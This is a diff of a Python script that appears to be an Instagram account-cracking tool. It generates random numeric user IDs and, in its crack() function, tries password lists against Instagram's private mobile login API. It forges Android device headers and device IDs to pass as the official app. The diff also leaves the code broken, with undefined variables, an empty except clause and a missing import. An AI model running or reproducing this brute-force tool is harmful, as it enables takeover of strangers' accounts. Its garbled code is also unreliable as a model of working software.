@@ -2,60 +2,18 @@
  
 #os.system("pip install requests")
 #os.system("pip install rich")
-import requests
-import bs4
-import sys
-import os
-import random
-import time
-import re
-import json
-import uuid
-import subprocess
-import marshal
-import rich
-import shutil
-import webbrowser
-import time, io, struct, base64, requests
-from random import randint
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
-from bs4 import BeautifulSoup as par
-from datetime import date
-from datetime import datetime
-# from rich import print as printer
-from datetime import date
-import marshal
+#--------[ DI BUAT OLEH ZORAA DEV ]--------#
 try:
-    import requests
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
-    import mechanize
-    from requests.exceptions import ConnectionError
-except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures==2 > /SUMON/null')
-    os.system('python SUMON.py')
-from bs4 import BeautifulSoup
-from datetime import date
-from datetime import datetime
-from time import sleep
-from time import sleep as waktu
-from requests.exceptions import ConnectionError as net_error
-import os
-import sys
-import re
-import time
-import json
-import uuid
-import string
-import random
-import requests
-from concurrent.futures import ThreadPoolExecutor as tpe
-from requests.exceptions import ConnectionError as ce
-try:
-    import urllib3
-except ImportError:
-    os.system("pip install urllib3")
-import urllib3
-import socket
+    import uuid, urllib, hashlib, base64
+    import os, re, sys, json, time, random, requests
+    from rich.panel import Panel
+    from rich.console import Console
+    from rich.tree import Tree
+    from rich import print as printz
+    from database.useragent_instagram import Useragent
+    from database.banner_terminal import Terminal
+    from concurrent.futures import ThreadPoolExecutor
+except(Exception, KeyboardInterrupt) as e:
 ###-------[BASIC COLORS]-----------####
 reset = "\033[0m"
 red = "\033[1;31m"
@@ -134,7 +92,7 @@ def random_number():
     for _ in range(limit):
         x = "".join(random.choice(string.digits) for _ in range(6))
         idz.append(x)
-    with ThreadPool(max_workers=30) as XYZ:
+    with ThreadPoolExecutor(max_workers=30) as XYZ:
         clear()
         total_idz = str(len(idz))
         print(f"\033[1;96m KING IS ALWAYS KING")
@@ -168,6 +126,10 @@ def crack(uid, pww, total_idz):
     try:
         for pw in pww:
             byps = requests.Session()
+            hash = hashlib.md5()
+            hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
+            hex = hash.hexdigest()
+            hash.update(hex.encode('utf-8') + '12345'.encode('utf-8')) 
             headers = {
                     'host': 'i.instagram.com',
                     'x-ig-app-locale': 'in_ID',
@@ -181,7 +143,7 @@ def crack(uid, pww, total_idz):
                     'x-bloks-is-layout-rtl': 'false',
                     'x-ig-device-id': str(uuid.uuid4()),
                     'x-ig-family-device-id': str(uuid.uuid4()),
-                    'x-ig-android-id': f'android-{self.hash.hexdigest()[:16]}',
+                    'x-ig-android-id': f'android-{hash.hexdigest()[:16]}',
                     'x-fb-connection-type': 'MOBILE.LTE',
                     'x-ig-connection-type': 'MOBILE(LTE)',
                     'x-ig-capabilities': '3brTv10=',
@@ -201,7 +163,7 @@ def crack(uid, pww, total_idz):
                     'x-pigeon-rawclienttime': str(round(time.time(), 3)),
                     'connection': 'keep-alive'
                 }
-            encode = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{self.hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(time.time)[:10]}%3A{urllib.request.quote(str(pw))}%22%2C%22family_device_id%22%3A%22{str(uuid.uuid4())}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(uid))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{self.hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{{str(uuid.uuid4())}}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49')
+            encode = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(time.time)[:10]}%3A{urllib.request.quote(str(pw))}%22%2C%22family_device_id%22%3A%22{str(uuid.uuid4())}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(uid))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{{str(uuid.uuid4())}}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49')
             headers.update({'content-length': str(len(encode)), 'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])})
             response = byps.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data = encode, headers = headers, allow_redirects=True).text
             if 'logged_in_user' in str(response):
@@ -214,8 +176,7 @@ def crack(uid, pww, total_idz):
         loop+=1
     except ConnectionError:
         time.sleep(10)
-    except Exception as error:
-        print({error})
+    except:
         pass
 menu()
  
